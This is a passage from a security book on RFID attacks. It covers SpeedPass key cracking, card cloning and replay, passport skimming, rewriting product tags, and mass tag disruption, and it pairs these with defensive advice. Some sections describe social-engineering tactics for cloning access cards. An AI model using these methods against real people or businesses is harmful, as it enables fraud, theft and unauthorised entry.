pairs from a victim in real-world situations. As part of their research, they tested common 
attack scenarios.
One scenario tested was to sit next to a volunteer victim and read the DST tag 
located in their pocket, with a laptop computer and a TI-DST microreader in a briefcase. 
They were also able to start a vehicle equipped with a DST tag using a bare key (without 
a transponder) and a cloned tag. They also successfully purchased fuel at several Exxon-Mobil 
gas stations with a cloned tag, proving that it was possible to break the system. The latter 
required the backseat of the vehicle to be ﬁ lled with computer equipment; therefore, it 
was important to reduce the amount of necessary equipment into something compact 
and portable.
Wisely, the Johns Hopkins team did not release all of the details regarding the internals 
of the encryption algorithm, thwarting many would-be thieves. If thieves wanted to abuse 
the system, they would have to replicate the work from scratch.
Lessons to Learn
The SpeedPass system did a lot of things right, but also took some shortcuts and concessions 
that caused problems. Overall, the system was secure for seven years before being successfully 
attacked.
At the time that the SpeedPass system was deployed, the TI DST tag was the most common 
tag with the most secure technology. Obtaining one was a wise decision, based on its small size, 
its ability to perform veriﬁ cation, and being tamper-resistant. Unfortunately, the small size and 
low power also became one of its problems.
A better cryptographic system for a tag would use some type of public/private 
key algorithm, preferably one that was publicly vetted and tested for many years, such as 
the RSA (Rivest, Shamir and Adleman) algorithm. As well, using a larger key size would 
make an attack a lot more work. The small size of the tag limited the amount of processing 
power available for cryptographic operations, which led to using a proprietary algorithm 

254 
Chapter 12 • RFID Attacks: Tag Encoding Attacks
and the 40-bit key space. To do more intensive operations would have required more 
processing power, which means a large size, a larger cost, and a larger amount of power 
to operate.
Encryption and veriﬁ cation are necessary if you are using RFID in a transaction system. 
If not, you are opening the door for people to abuse the system with cloned tags, the high 
tech version of pick pocketing. However, choosing a system that is secure does not mean 
that it will become less secure tomorrow. All systems should be periodically reviewed and 
any improvements made. In the case of the SpeedPass, it may be wise to investigate whether 
there is another tag on the market with stronger encryption that could be migrated in the 
event of a break in security.
On a public system, any number of people are working to locate ﬂ aws in its security. 
There were at least two groups actively working towards ﬁ nding a way to clone the 
SpeedPass, both of which were benign research efforts. Keeping on top of the ever-changing 
world of security gives you the ability to choose a product wisely and to adapt to any new 
threats or new problems quickly and easily.
While the methods used by the Johns Hopkins team required a fair amount of work, 
they made several suggestions for ways to make the job easier. The easiest way to speed up 
the discovery of a key is to pre-compute every possible key.
If you are trying to crack the code of a tag with an unknown key, you must have two 
challenge/response pairs (one to look for the key, and the other to verify that you have the 
correct key). You also have to redo all of the math necessary to look for the key that, when 
used in the algorithm, gives the correct response to that challenge. If you can control the 
challenge used to generate the response, you can save a huge amount of calculations for 
future attacks; which is known as a time-memory trade-off. Imagine you have two tags with 
different keys but the same challenge. Because each tag has a different key, you will get two 
different responses. To crack each tag, you have to test every key until you receive the 
expected response. Instead of testing for the key that gave you the correct response, you 
calculate and record the response for every key. You now have a table that gives you any 
key you want in seconds. If you generate a lookup table with the ﬁ rst tag, and then send 
the same challenge to the second tag, all you have to do is look in the table for that 
response and for the key that gives the correct result.
The size of the table is very large, however it is easier to look up the answer in a 
table, rather than doing the math over again. With the cost of storage dropping dramatically 
and the size of storage media becoming greater and greater, precomputing tables much 
larger than the ones for SpeedPass tags is possible and more economical in terms of ﬁ nancial 
and processing costs. Much like multiplication tables in grade school, this method is a 
shortcut involving a lot of math in the beginning, but once it is done you will save time by 

 
RFID Attacks: Tag Encoding Attacks • Chapter 12 
255
looking up the answer in a precomputed table (see http://lasecwww.ep f l.ch/pub/lasec/doc/
Oech03.pd f ).
The Johns Hopkins team has suggested a device consisting of a reader, a simulator, and a 
small onboard computer (e.g., a Personal Digital Assistant [PDA]) with a variety of storage 
media. The device would challenge nearby tags and record the responses. The computer 
could then look on a precomputed hash table and emulate the tag and provide valid 
responses through the simulator.

256 
Chapter 12 • RFID Attacks: Tag Encoding Attacks
Summary
The SpeedPass vulnerabilities show that while RFID is a convenient technology, the trade off 
from the small size and the convenience, is processing power and security. If the engineers 
had selected and implemented a stronger challenge/response system, the cost of the devices 
would have gone up and the SpeedPass system may not have been as successful. Exxon-
Mobil must decide how best to serve the needs of the security of their customers, and shore 
up the security of the SpeedPass.
In the end, it is up to the individual company to acknowledge that some products are not 
secure forever. Therefore, the program should evolve, and the anticipated work and cost 
should be factored in from the beginning. Such prudent planning will help you if the product 
you are dependent on fails.

MIM
A Man in the Middle (MIM) attack is an attack angle that takes advantage of the mutual 
trust of a third party, or the simultaneous impersonation of both sides of a two-way trust.
MIM attacks are unknown parties in a communication, who relay information back and 
forth, giving the simultaneous appearance of being the other party.
Radio Frequency Identiﬁ cation (RFID) is particularly susceptible to MIM attacks because 
of its small size and low price. Most RFID technologies talk to any reader close enough to 
read the signal. There is no user interaction in reading the tag, and no authentication of the 
reader takes place. Consequently, you can walk up to someone with an RFID tag and a reader 
tuned to the frequency of their tag, and read or interact with their tag without he or she 
knowing, while replaying or emulating the tag to the reader at the same time.
Chip Clones - Fraud and Theft
Physical access control—the ability to control when and where people go—is a big problem 
in the business world. The easiest solution is to have guards at the doors to all sensitive areas; 
however, this has its drawbacks. Guards are expensive, make mistakes, and do not like to keep 
audit trails. Master key lock systems can also be a problem, because a dismissed employee 
may have a copy of the key, thereby forcing you to buy all new locks.
At some point, someone introduced access cards in the form of magnetic strip cards. These 
systems had a computer-driven backend; cards could be revoked and removed from the 
system, and logs kept of who went where and when. The problem with these systems was 
the mechanical wear. Magnetic strip cards have to be physically swiped through the reader, 
which leads to the card becoming worn down.
RFID technology was applied in what is known as proximity cards. These cards are active 
RFID implementations, meaning they have their own on-board power source (usually coin 
cell batteries or a passive device powered by a radio ﬁ eld generated by the reader). The entire 
unit is sealed and roughly the size of a credit card.
The cards vary widely in cost and technology, but generally, there is a piece of plastic with 
a coil and a RFID chip embedded inside. Sometimes these cards are used as photo ID cards, 
and sometimes they are left blank. Depending on the implementation used, the cards can be 
read-only, programmed at the factory, or a “write once” card that the system administrator can 
write to. The cards can also be read-write, which are used for access control.
Since RFID uses a radio-based reader rather than contact-based, there is less wear and 
tear on the cards and little to none on the reader, which lowers the maintenance costs. The 
interaction of the readers with a backend database allows for more granularity in access 
control.
After passing the card over the reader, the reader quickly looks up the identiﬁ er from the 
card in the database, checks to see if you are allowed past that door, and unlocks the door if 

 
RFID Attacks: Tag Application Attacks • Chapter 13 
259
you are. Each time you wave the card, the reader keeps an audit trail by entering the time, 
date, card ID, and location of access.
These cards can also be used to login to computers. Several packages use proximity cards 
as a method for logging into the network. This adds an additional layer of security when 
used in conjunction with user names and passwords.

Notes from the Underground…
Three Factors of Security
The following three major factors of security form the basis of most security systems:
■ “Something you are” is an identiﬁ er (usually biometric), that is inherent in 
every individual, such as facial features and ﬁ ngerprints. It can also be a 
voice or the heat in the veins in someone’s face.
■ “Something you have” is something that you physically own and need in 
order to be able to login (e.g., your ATM card at the bank machine).
■ “Something you know” means private information that only you know 
(e.g., passwords or PIN numbers), which most people use on a daily basis.
None of these methods provide the best level of security when used alone. 
However, using them in combination dramatically increases the level of security. Two-
factor authentication occurs every time a credit card is used. The card is the “some-
thing you have,” the signature matching the signature on the card is the “something 
you are,” your ATM card is the “something you have,” and the PIN is the “something 
you know.”
The best security systems use all three factors, thereby making it very difﬁ cult for 
an attacker.
Most of the time, these systems use a basic identiﬁ cation scheme. The card talks to any 
reader that asks for its code (usually an ID number), which also makes the system easy to 
operate. While some systems use tags like the TIRIS DST tags used in the SpeedPass system, 
these systems are a lot more expensive, and the majority of them were installed years ago 
using old technology, and are not encrypted.
The cards give their code to readers that can talk without veriﬁ cation. Without a veriﬁ cation 
system, any device issuing the correct code to the reader is allowed in. This vulnerability 
must be addressed, understood, and weighed when considering a proximity card system.
Let’s look at active cards ﬁ rst. The credit card in your pocket is a tiny radio station that 
shouts its code to anyone with a radio close enough to hear it. If you told the guard your 

260 
Chapter 13 • RFID Attacks: Tag Application Attacks
secret password, you would whisper it in his ear so no one would hear. The tag in your 
pocket is also shouting to him, so anyone within earshot can learn it. This is a serious 
security implication. If I can read your card, as far as the system is concerned I am you.
Passive cards are no less vulnerable. Any reader capable of reading a passive card has the 
capability of powering it. The only difference is that the effective range is less due to power 
limitations. However, even that can be overcome with higher-gain antennas.
If I copy your keys without touching them, you will not know until it is too late. With 
nothing more than a card reader attached to a Personal Digital Assistant (PDA), I can capture 
the code from your card in your pocket without you noticing. Now that I have the code, 
I can re-transmit it to the reader. The attacker effectively becomes you.
A smart attacker looks at the layout of the company they are attacking. Not the physical 
layout necessarily, but the human layout. Any place with a large proximity card installation 
usually has a personnel hierarchy. Knowing who is on the top and who is on the bottom is a 
great way for attackers to target an organization.
In most organizations, the boss likes to be in control; he or she do not like being shut 
out. If you were implementing a proximity card system in your business, would you limit the 
boss’ access? Of course not, because you would be ﬁ red. The boss wants his card to have 
access to everything, which makes it valuable to attackers.
You would think that obtaining a card’s code would be hard in the hands of the boss. 
If you can get close enough, all you need is a few seconds to capture the code, quietly and 
easily, particularly in an elevator, an environment of close proximity where people avoid 
eye contact. All an attacker would need is the opportunity, of which there are many. Once 
you have your boss’ card code, you can clone their card, become them, and gain all their 
access.
What if you cannot get close enough to the boss to clone his card? As mentioned earlier, 
it is important to know the top and the bottom of any organization. The bottom of the 
organization commonly has more access than anyone else (sometimes even more than the 
boss). The janitors usually have keys to everything as a part of their job function so that they 
can enter locked areas to perform their duties. So, if you cannot clone from the top, clone 
from the bottom. Tell the janitor what a ﬁ ne job he or she is doing and shake their hand, 
while the reader in your other hand scans their pocket. Once you get the code, you have a 
master key.
Most systems have an audit log that records the comings and goings of employees, 
thereby providing a forensic trail. These logs also log faults such as doors jammed open, or 
situations where the same person enters a room twice without leaving (signs of a cloned 
card). These logs are a great source of security. Knowing who is going where and when can 
also help spot anomalies.
In some respects, a proximity card system is like a highly vulnerable system fraught with 
security perils. However, there are a lot of things that can be done to strengthen the system 
and make it signiﬁ cantly more robust.

First, restrict everyone to the areas they need to be in, including the boss. Those restrictions 
should also restrict the times that a person can enter. If an employee is scheduled to work 
9:00 am to 5:00 pm, Monday through Friday, they should have access to the building between 
8:00 am and 6:00 pm, Monday through Friday. This limits the window in which a cloned card 
can be used.
Leverage the log ﬁ les. Real-time monitoring of log ﬁ les catch a lot of problems as they 
occur, rather than after the fact. If Frank enters the research lab ﬁ rst thing in the morning, 
before he can go into the ﬁ le room on the other side of the building, he has to exit the 
research lab. If the log sees Frank enter the research lab twice without leaving, something 
needs to be investigated. Automated log processing also notices things like a 9:00 am to 
5:00 pm, Monday through Friday employee mysteriously entering the building at 3:00 am 
on a Saturday. If it is a 24-hour company, an extra person might not be noticed, but an 
automated log monitor could alert a guard that there is an anomaly worth further 
investigation.
To maximize log ﬁ les, you have to restrict and prevent people from “surﬁ ng” (i.e., 
entering a door on someone else’s card). Someone entering using another person’s card 
interferes with the audit trail.
Another often overlooked and easy method of protecting cards is shielding them in a 
holder when they are not being used. Provide your users with a holder or case made of 
metal or lined with a metal layer, to prevent the card’s radio transmissions from making it 
into the case.
Cloned cards are a risk only if the person using them is not noticed. To walk into a 
secured area in the middle of the day with a cloned card and not be noticed or questioned, 
would take an attacker with guts. Adding a PIN and requiring a code makes the attackers’ 
job a lot harder because now, in addition to having to get close enough to clone your card, 
they also have to be close while you punch in your code, which is much harder to do.
A common sight at high security locations is a guard in a guard booth staring at a screen 
out of view, as people come and go with their proximity cards. A lot of people think the 
guards are watching TV under the desk, and while this may be the case once in a while, 
more often than not they are acting as human veriﬁ cation of the automated system. When 
an employee is enrolled in the system and given their card, a photo of the employee is 
attached to their record. When the employee waves their card, their picture pops up on the 
screen for the guard to compare. This veriﬁ cation system also allows for human intuition. 
A person that seems nervous or edgy might throw up enough red ﬂ ags to make a guard 
check the situation out further.
In 2003, Jonathan Westhues wrote on his Web site (http://www.cq.cx) about a device he 
designed. The device was a homemade proximity card skimmer the size of a credit card. It 
was built to attack the Motorola ﬂ expass system, which is a passive RFID system, but the 
principals he followed apply to any simple RFID-based access control system using a straight 
ID code system.

262 
Chapter 13 • RFID Attacks: Tag Application Attacks
Jonathan began by reverse engineering the signaling of a proximity card system 
(without the beneﬁ t of reading the datasheet on the technology). First, he determined 
the frequency that the cards operated at using a wide band receiver (the frequency was 
125 kHz). After analyzing the signal, he determined that the modulation of the signal was 
coming from the tag, thus understanding how the card transmitted 1s and 0s. He then 
built his own reader to test his cards.
He also created a simulator that would transmit a code using the same frequencies and 
modulation (basically a card simulator). What really fascinated people was the fact that he 
built both devices into one very small card. Using two buttons in a card barely bigger than 
the proximity card he was simulating, he could capture and later replay the code from any 
nearby ﬂ expass card. One button turned the device into a reader, recording the code from a 
nearby proximity card and storing it in memory, and sampling it several times to make sure 
the code was correct. The other button turned the unit into a card simulator, broadcasting 
the captured code stored in memory.
This device rocked the security world. A skilled attacker could use the information on 
his or her site to replicate the device and build their own.
Proximity cards are a convenient form of access control, because they allow for easy 
access for employees, minimal wear over time, and a great amount of adaptability and 
growth. For retail stores, ofﬁ ce buildings, and even some new homes, they are a great way to 
“keep the honest people honest.” However, when used in a high security situation, that 
convenience can also be a huge weakness. Protecting cards from eavesdropping, limiting 
access to only that which is essential, auditing logs, encrypted cards, and due diligence are 
the best ways to keep a system secure.
Tracking: Passports/Clothing
A lot of press regarding RFID has been about its possible covert tracking possibilities. This 
speculation and misinformation has led people to be wary of RFID.
RFID is not a high-tech bugging device. It does not have Global Positioning System 
(GPS) functionality or the ability to talk to satellites. At its base, RFID technology is a new, 
high-tech version of the bar code. The difference is the identiﬁ cation of items. RFID makes 
it so that it can be read at a distance, without a line of sight. The tag attached to an item, 
pallet, or case, is a reference identiﬁ er only.
Wal-Mart is a major industry leader in improving supply chain streamlining, which is 
why they are encouraging their major suppliers to integrate RFID into their supply chains. 
The ability to scan a pallet at 30 mph along a conveyor belt and not have to worry about bar 
codes being obscured or unreadable, means that product can be moved faster. Inventory can 
automatically scan as it enters or leaves the warehouse, saving time and improving the ﬂ ow 
of product to the stores. Right now, Wal-Mart is only using RFID tags at the pallet level, not 
individual product packaging, which is the next logical step.

Notes from the Underground…
Wal-Mart and RFID
Wal-Mart is a big proponent of RFID technology; however, their plans are not as insidi-
ous as some people think.
As with any technology, there is the potential for abuse by those implementing 
it. A lot of times these abuses occur when the technology is taken to its limit. While 
the risks are valid, abusing customers is not good for business, and the public backlash 
can have profound effects on a business.
Razor blades are a common item of high value and small size; perfect for thieves. 
Up to 30 percent of Gillette’s stock is lost due to the shrinkage (theft) of their product 
between the factory and the sales ﬂ oor. In an effort to cut down on theft, Gillette 
started a pilot program in conjunction with Wal-Mart. The individual packages of 
razor blades were equipped with RFID tags at the factory and the retail shelf was 
equipped with a reader. When a package of razor blades was removed from the shelf, 
a hidden camera took a picture of the shopper. When the customer went through the 
checkout line, another picture was taken. At the end of the day, store security could 
reconcile the razor blades taken with the razor blades sold. If any were unaccounted 
for, they had a picture of the possible thief. However, this did not sit well with custom-
ers, and there was no policy in place explaining what happened to the photographs 
at the end of the day.
Consider the following theoretical situation. You buy a sweater that contains an RFID 
tag. When you go through the checkout line, the item is scanned and you pay for it with 
your credit card. A few weeks later you wear the sweater to the same store where you 
purchased it. Provided the tag still works, when you enter the store, the reader in the door 
recognizes the ID number and matches it to your name and credit card information. This 
may not seem terribly intrusive; however, it can get worse.
Imagine a scenario of shopping in the future. As you walk into a high-end store, a 
scanner reads the tags on all of your clothing, thus providing a ranking system based on 
where the clothing was purchased. This kind of proﬁ ling would help store clerks identify 
you as a legitimate customer (i.e., “moneyed”).
Eventually, thieves, pick pockets, and other bad guys will adopt RFID to improve the 
efﬁ ciency of their operations. A thief might carry an RFID reader to scan for potential 
targets (e.g., people who own high value items), or they might scan someone’s clothing to 
determine whether they are worth kidnapping.
Rumors have been circulating for years regarding the European Central Bank’s interest 
in embedding RFID technology into European bank notes as a counterfeiting prevention 

264 
Chapter 13 • RFID Attacks: Tag Application Attacks
mechanism. The idea is for a tag containing a 38-digit number (comprised of the serial 
number, the value, and data regarding when and where it was made) be embedded into 
every bank note. A potential counterfeiter would then have to put matching information on 
their counterfeit RFID tag in addition to the traditional anti-counterfeiting measures. Banks 
would be able to scan a box of money to ﬁ nd out if any of the notes were counterfeit. 
Kidnappers would be prevented from asking for unmarked notes, and border guards would 
be able to detect people traveling with large sums of cash (usually a sign of money 
laundering or other illegal activity). (See http://www.edri.org/edrigram/number3.17/RFID.)
Thieves would have a ﬁ eld day with this new technology. A smart thief would be 
outﬁ tted with a portable RFID reader for scanning potential victims. Knowing the exact 
amount of cash a potential target has, would be a great advantage for thieves. RFID’s reliance 
on counterfeit protection is also fraught with logistical problems. Unless the tags are 
extremely durable and guaranteed not to fail, their use as a veriﬁ cation method is moot. 
Damaged tags are unreliable and should not be used as a counting mechanism, unless a way 
is found to protect the privacy of money when it is in someone’s possession, and to prevent 
the accidental or intentional deactivation of the tags.
Passports
The US government plans to use RFID tags in new passports for tracking purposes. 
Ofﬁ cially, the RFID tag is used for updating security and counterfeit protection, and for 
conforming to the International Civil Aviation Organization (IACO) machine-readable 
travel documents. However, this addition to the US passport has caused a huge debate 
among security and privacy experts, and national security advocates. At the time of this 
writing, the US is still in the beginning stages of deployment; therefore, there are no “real” 
results showing that the system works.
The new passport design integrates an RFID tag into the front or back cover of the 
passport, near the ISO 14443A and 14443B format speciﬁ cations. The tags operate in the 
13.56 Mhz range and contain a small amount of storage. The speciﬁ cations call for the 
passport to be readable 10 centimeters from the reader, and will contain the same 
information as is printed in the passport, including the photo. With this addition, a forger 
would have to forge the physical passport as well as all of the anti-counterfeit measures, and 
then integrate an RFID chip containing that same forged data. It would make stolen or lost 
passports much harder to alter, because the new name and information would differ from 
the information on the RFID tag. It is assumed that in the future, a chip will store a person’s 
biometric information (e.g., ﬁ ngerprints, iris scan, and so on), which would increase the 
ability for border guards and issuing agencies to conﬁ rm someone’s passport.
The IACO is an organization that sets international standards for civil air travel. They 
specify international base standards for baggage and passengers, make sure that ﬂ ights from 
one country to another are compatible (radio frequencies, standard terms and procedures, 

 
RFID Attacks: Tag Application Attacks • Chapter 13 
265
and so forth), and ensure that everything is working safely and efﬁ ciently. They also specify 
standards regarding travel documents, so that each country’s documentation is compatible 
and interoperable with the other countries’ documentation. They were originally speciﬁ ed to 
be machine-readable using optical character recognition (OCR).
The new standards specify the co-existence of newer technologies with the older OCR 
systems. These new standards specify requirements such as how much storage, what should 
be in the storage, and so forth, but they leave it to member states to select speciﬁ c 
technologies. Member states can also increase or implement additional technologies if they 
wish; however, they still have to meet the international baseline requirements.
The US State Department speciﬁ ed that the new US passports would increase the 
available memory from 32 kilobytes to 64 kilobytes, presumably for future use with 
biometrics information. They also chose to use a contactless chip technology (RFID) rather 
than a contact-based technology such as smart cards or a magnetic strip. Using RFID chips 
is recognized in the ICAO speciﬁ cations as valid technology; however, some people think 
this is a bad choice for a security device, because the ICAO speciﬁ cation does not require a 
digital signature or encryption of the information on the tag.
One major concern is “skimming,” which is the ability to covertly read information on a 
passport. The fear is that criminals would be able to pick Americans out of a crowd or have 
their vital information broadcast to anyone in range. The problem is that the speciﬁ cation 
covers the minimum range at which tags should be able to be read (0 to 10 cm), but does 
not specify a maximum range. However, with a high-powered reader and antenna it is 
possible to read the tag from several feet away. At the Black Hat 2005 Security Conference 
in Las Vegas, NV, a company called Felixis, demonstrated how to read a tag from 69 feet.
The fear is that American travelers abroad could be identiﬁ ed by the presence of their 
passport and possibly targeted for kidnapping or robbery. The unencrypted information also 
reveals more than most travelers wish to share. The possibility also exists for foreign persons, 
either governmental or private, to track American citizens. Cryptographer and security expert, 
Bruce Schnier, points out that the presence of US passports can also cause dangerous problems. 
Terrorists could have a bomb rigged with an RFID reader that will explode when more than 
one US passport is in range. Or they can scan down hotel hallways looking for Americans to 
kidnap or rob. These are all within the realm of possibility with existing technologies.
In February 2005, after the State Department made a public comment on the proposed 
changes to the US passport system, they received thousands of responses that were 
overwhelmingly (99 percent) against the system. At this point a lot of the security advocates’ 
concerns were noted and the system was reviewed. (See http://travel.state.gov/passport/eppt/
passport_comments.php.)
Based on the public outcry, the State Department made revisions to the proposed system, 
including encrypting the data on the RFID tag and printing the key on the optically read 
section of the reader for decoding on the PC. This way, any intercepted data is garbled and 
unreadable without the key, which is accessible only with physical access to the passport. It is 

266 
Chapter 13 • RFID Attacks: Tag Application Attacks
hard to imagine a 128-character key being printed on a passport, let alone strong publicly 
vetted encryption being used on the tag. Presuming the encryption method is known or 
learned, the key space for searching the information is considerably small and within the 
realm of brute force attacks. The State Department also mandated the inclusion of a metallic 
layer in the front and back covers and along the spine of the passport, to prevent the tag 
from being able to interact with a reader unless it is open (i.e., a ‘ ‘tin foil hat’ ’ solution to 
allay the concerns of the privacy advocates). The problem is that the foil cover may not be 
able to stop transmissions at close range. Another issue is that the foil may not always be in 
good enough condition to protect the tag.
Using a printed key is also not a good choice. Passports are used all over the world as non-
governmental identiﬁ cation for things such as hotel reservations and Internet cafes, all of which 
need you to open your passport and expose the RFID tag and the printed key. In the case of 
hotel reservations, the passport is required to be photocopied and kept on ﬁ le, including the key.
Even if the information is encrypted, a passport can still be identiﬁ ed as American. To prevent 
problems where more than one tag is in range of a reader, every tag has a collision-avoidance 
identiﬁ er, which is a unique identiﬁ er that allows the reader to distinguish one tag from another.
Having RFID in passports also solves a standards compliance problem and a political 
problem concerning the perceived need to increase passport security. However, looking 
beneath the surface of the new technology, you can see that there are some big problems 
that need to be addressed. Using a security device in something as important as a passport 
should be evaluated extensively, because of the profound implications if it is done wrong.
Chip Cloning > Fraud
If companies like Wal-Mart have anything to say, all products will eventually contain RFID 
chips on their packaging. Efforts to RFID-enable product are driven by the goal of 
streamlining the supply chain, increasing convenience to the consumer, and theft deterrents. 
While these are very respectable goals, the use of RFID could also have some disastrous 
consequences for your business.
Stores have the ability to do inventory with the push of a button. The ability of the 
consumer to get more information about a product from an automated kiosk or PDA 
attached to a shopping cart, has been a dream of future thinkers for years.
Several years ago, European store chain, METRO Group, began a trial to test technologies 
and concepts for the proverbial “store of the future.” METRO Group and their partners 
wanted to test some of the ideas seen as the future of shopping, including using RFID 
technology on individual products.
The store was set up in a middle class suburban town called Rheinberg, Germany, and 
named “Future Store.” This new store was the “petri dish” for developing new technology 
for possible deployment across the whole industry. Basically, they were using customers as 
‘ ‘guinea pigs’ ’ to test the abilities of these new technologies. (See http://www.future-store.org.)

 
RFID Attacks: Tag Application Attacks • Chapter 13 
267
RFIDs are in stores in the form of tags on four products: Pantene shampoo, Gillette 
razor blades, Philadelphia Cream Cheese, and DVDs). Each item was individually marked 
with a 13.56 Mhz RFID tag, with readers built into the shelf to monitor inventory levels. 
DVDs are tagged for use at a media station that plays a clip from the movie, by waving the 
DVD past the reader.
The Future Store RFID tags contain a unique ID number in read-only memory, which 
is programmed at the factory at the time of manufacture. The chips also contain a small 
amount of user-writable memory that is used as an Electronic Product Code (EPC) to 
identify the type of item it is attached to. A store can use one type of tag for different 
products, by writing a different EPC value on each tag. This way, the shelf scanners can tell 
the difference between shampoo and razor blades.
To allay concerns about privacy, the store provided “deactivation” kiosks that would 
deactivate any tags on merchandise. Store literature also stated that RFID tags would not 
function outside of the store.
In 2003, German privacy group, FoeBuD, toured the future store with privacy advocate, 
Katherine Albrecht, founder and director of CASPIAN, an anti-RFID group. They were led 
on the tour by executives of METRO Group to fully explain and allay any concerns 
regarding RFID use.
In 2004, at the Black Hat Conference in Las Vegas, NV, Lukas Grunwald gave a talk 
about RFID and some creative attack vectors. His test bed was the future store in 
Rheinberg. He released a program he developed called “RF-dump,” on an IPAQ PDA 
with an RFID reader. Using this program, he could scan the products in the Future Store. 
What he found interesting was that the “deactivation” kiosks wrote only zeros to the EPC 
part of the tag, which got him thinking that if the tags were being overwritten on their 
way out of the store, they must also be writable in the store. Using off-the-shelf software, 
he was able to rewrite the EPC of the products’ tag, turning razor blades into cream 
cheese. If a $25.00 DVD is rewritten to be a $0.30 stick of gum, that DVD is suddenly be 
on sale. With self-checkout, the lack of human interaction means that discrepancies are 
much harder to notice.
The deactivation kiosks installed and advertised as a solution for privacy concerns, were 
found to be totally inadequate. When a product was placed on the kiosk, it overwrote the 
EPC section of the tag with zeros, leaving the manufacturer’s serial number intact, and left 
the tag in an operational state, complete with its unique serial number. Their claims that the 
tags would not function outside the store were greatly exaggerated. Privacy advocates were 
able to read the tags with easily available equipment, long after leaving the store.
Rewriting tags on a shelf has obvious implications for the theft of single items, but what 
happens if you rewrote all the cream cheese to be razor blades? The reader in the shelves 
would read the change, see that there was no more cream cheese, and then order more even 
if there was some physically sitting on the shelf. The reader only reads the tags, which could 
cause a major problem in the supply chain.

268 
Chapter 13 • RFID Attacks: Tag Application Attacks
FoeBuD and CASPIAN posted their ﬁ ndings to the Web site www.spychips.com and made 
headlines around Europe for their efforts. One of their chief discoveries was that consumer 
loyalty cards contained an RFID transponder. The existence and purpose of this transponder 
was never disclosed to consumers. Executives tried to cover up this oversight by explaining that 
they used it as an age veriﬁ cation mechanism to prevent minors from viewing clips of R-rated 
movies. They failed to disclose this fact to their customers, and the backlash was immense.
Protests and boycotts forced the company to replace all of the RFID-enabled “loyalty 
cards” with non-RFID cards. They also served as a warning to other retailers to be more 
open in their disclosure of RFID uses.
Disruption
RFID tags show the promise of revolutionizing industry supply chains the world over. 
Dependence on this technology working perfectly will become more important as time goes 
by and automation becomes more integrated into the supply chain. The failure of the tags 
could lead to lost product or major problems and delays in the supply chain.
Depending on the RFID implementation, there are some provisions for deactivating 
and rendering tags ‘ ‘dead’ ’ and unreadable. This is usually done at the point of sale (POS) 
through the introduction of a high-power RF ﬁ eld that induces enough current to burn out 
a weak section of the antenna. This cuts the chip off from the antenna, rendering it unusable. 
This is usually done to address privacy concerns and to deactivate the chips that are being 
used as a theft deterrence.
Having an entire store dependent on a RFID inventory system has obvious beneﬁ ts; 
however, the possibility for mischief and mayhem probably will not get past people with 
malevolent intent.
Anyone can have the technology to induce a ‘ ‘kill’ ’ signal into their chips at checkout. 
The usual range of such a kill signal is only a few inches; however, it would not be hard for 
an engineer to rig up a high-gain antenna tuned to the necessary frequency, along with a 
higher power transmitter. Throw in a battery pack and you could probably ﬁ t it all into a 
backpack. Walk into a store and, with the ﬂ ip of a switch, kill every tag in the place, causing 
a large level of retail chaos. Products will not scan, inventory systems will go down, and 
clerks will have to deal with shoplifters.
Deactivation and disruption do not necessarily have to be malicious. Given the number 
of new wireless technologies, it is not outside the realm of possibility that newer 
technologies could cause disruption. In the days of the optical bar code, it was pretty hard to 
mess up the bar code. If it did not scan, there was a number printed on it that could be 
typed in manually. If there is interference in the RFID system is there a backup in place? 
Can the tags be manually entered? Do the employees know what to do in case of 
interference or other disruption?

Summary
Managing risk—security risks or any other risks—requires that you know the threats and 
value of what you are getting yourself into. If the risk-reward ratio is comfortable enough 
for you, you dive in. If not, however, you reevaluate or to try something else. Looking before 
leaping is an appropriate adage to follow for any IT project, and RFID is no exception.
At its heart RFID has many beneﬁ ts and features that dazzle some people who check 
out this technology. These people rush into a deployment, and when things backﬁ re, they 
are left in the unenviable position of having to explain that their reliance on inappropriate 
decisions about what features to use and deploy caused things to go wrong.

Chapter 14 • RFID Attacks: Securing Communications Using RFID Middleware
RFID Middleware Introduction
A key challenge to changing to a standards-based infrastructure is that tag data can be 
hijacked if there is no reliable multi-level security built into the system. This chapter look 
at ways that multi-layered security built into the Radio Frequency Identiﬁ cation (RFID) 
middleware layer can be used to prevent unauthorized access. We also look at the middleware 
implementation provided in Commerce Events’ AdaptLink™, which provides a scalable security 
infrastructure to thwart RFID attacks.
We begin by examining the EPCnetwork™ protocols adopted by EPCglobal, the de 
facto standard for the current cryptographic techniques used within the enterprise. The 
Public Key Infrastructure (PKI) is used to authenticate the handshake between the tag and 
the reader, and RFID middleware is used to authenticate the handshake between the reader 
and the network.
In this chapter, we recall the security fundamentals and principles that are the 
foundation of any good security strategy, addressing a range of issues from authentication 
and authorization, to controls and audit. No primer on security would be complete 
without an examination of the common security standards, which are addressed alongside 
the emerging privacy standards and their implications for the wireless exchange of 
information.
Electronic Product Code System Network 
Architecture
RFID is used to identify, track, and locate assets. The vision that drives the development at 
the Auto-ID Center is the unique identiﬁ cation of individual items. The unique number, 
called the Electronic Product Code (EPC), is encoded in an inexpensive RFID tag. The 
EPC Network also captures and makes available (via Internet and for authorized requests) 
other information pertaining to a given item. See Figure 14.1.
EPC Network Software Architecture Components
The EPC Network architecture (see Figure 14.1) shows the high-level components of the 
EPC network, which are described in the following sections.
Readers
Readers are the devices responsible for detecting when tags enter their read range. They are 
also capable of interrogating other sensors coupled to tags or embedded within tags.
Auto-ID Reader Protocol Speciﬁ cation 1.0 deﬁ nes a standard protocol by which 
readers communicate with EPC and other hosts. The Savant also has an “adapter” provision 
to interface with older readers that do not implement the Auto-ID Reader Protocol.

 
RFID Attacks: Securing Communications Using RFID Middleware • Chapter 14 
273
RFID Middleware
RFID middleware is software that was designed to process the streams of tag or sensor data 
(event data) coming from one or more reader devices. It performs the ﬁ ltering, aggregation, and 
counting of tag data, reducing the volume of data prior to sending it to Enterprise Applications. 
Auto-ID Savant Speciﬁ cation 1.0 deﬁ nes how RFID middleware works, and how it deﬁ nes the 
interface to Enterprise Applications. This speciﬁ cation has now been replaced by EPCglobal 
Architecture Framework Version 1.0. More details are available at www.epcglobalinc.com
EPC Information Service
The EPC Information Service makes EPC Network-related data available in Physical 
Mark-Up Language (PML) format to any requesting service. The data available through 
the EPC Information Service includes tag read data collected from RFID middleware 
Figure 14.1 EPC Network Architecture—Components and Layers

274 
Chapter 14 • RFID Attacks: Securing Communications Using RFID Middleware
(e.g., to assist with object tracking and tracing serial number granularity); instance-level data 
such as the date of manufacture, the expiry date, and so on; and object class-level data such 
as product catalog information. When responding to requests, the EPC Information Service 
draws on a variety of data sources that exist within an enterprise, translating that data into 
PML format. When the EPC Information Service data is distributed across the supply chain, 
